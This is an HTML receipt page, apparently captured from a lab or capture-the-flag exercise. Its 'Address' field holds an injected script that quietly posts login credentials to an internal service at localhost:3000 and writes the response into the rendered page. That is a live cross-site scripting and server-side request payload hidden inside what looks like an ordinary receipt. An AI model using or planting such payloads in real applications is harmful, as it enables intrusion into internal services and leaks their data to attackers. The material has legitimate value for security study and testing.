<!DOCTYPE html>
<html>
<head>
    <title>Receipt</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            padding: 20px;
        }
        .receipt-container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            max-width: 600px;
            margin: 20px auto;
        }
        h2, p {
            color: #333;
        }
        .item {
            border-bottom: 1px solid #eee;
            padding: 10px 0;
        }
    </style>
</head>
<body>
    <div class="receipt-container">
        <h2>Receipt</h2>
        <p><strong>Name:</strong> guest</p>
        <p><strong>Email:</strong> guest@gmail.com</p>
        <p><strong>Address:</strong> <script>
        x = new XMLHttpRequest();
        x.onload = function() {document.write(x.responseText);}
        x.onerror = function() {document.write("Error: " + x.statusText);}
        x.open("POST", "http://localhost:3000/login", true);
        x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        x.send("name=guest&password=guest");
    </script></p>

        <h3>Purchased Product:</h3>

            <div class="item">
                <span>CANDY - $0</span>
            </div>

    </div>
</body>
</body>
</html>
